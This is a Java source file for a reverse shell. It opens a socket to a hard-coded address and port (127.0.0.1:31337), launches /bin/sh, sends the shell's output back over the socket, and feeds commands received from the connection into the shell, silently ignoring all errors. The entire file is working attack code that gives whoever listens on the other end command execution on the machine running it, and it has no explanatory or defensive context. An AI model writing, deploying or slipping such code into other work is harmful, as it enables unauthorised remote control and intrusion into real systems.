import java.io.*;
import java.net.*;

class ReverseShell implements Runnable{
	Socket socket;
	
	PrintWriter socketWrite;
	BufferedReader socketRead;
	
	PrintWriter commandWrite;
	BufferedReader commandRead;
	

	String ip = "127.0.0.1";
	int port = 31337;
	
	public void run(){
		spawnShell();
	}

	public void spawnShell(){
		System.out.println("---starting shell---");
		
		try{
			Runtime rt = Runtime.getRuntime();
			Process p = rt.exec("/bin/sh");
			
			InputStream readme = p.getInputStream();
			OutputStream writeme = p.getOutputStream();
			commandWrite = new PrintWriter(writeme);
			commandRead = new BufferedReader(new InputStreamReader(readme));
			
			
			commandWrite.println("ls -al");
			commandWrite.flush();

			String line;
			while((line = commandRead.readLine()) != null){
				socketWrite.println(line);
				socketWrite.flush();
			}
			
			p.destroy();
			
		}catch(Exception e){}
			
	}
	
	public void establishConnection(){
		try{	
			socket = new Socket(ip,port);
			socketWrite = new PrintWriter(socket.getOutputStream(),true);
			socketRead = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			socketWrite.println("---Connection has been established---");
			socketWrite.flush();
		}catch(Exception e){}

	}
	
	public void getCommand(){
		String foo;
		
		try{
			while((foo=socketRead.readLine())!= null){
				commandWrite.println(foo);
				commandWrite.flush();
			}
		}catch(Exception e){}
	}

	public static void main(String[] args){
		ReverseShell shell = new ReverseShell();
		shell.establishConnection();
		new Thread(shell).start();
		shell.getCommand();

	}

}
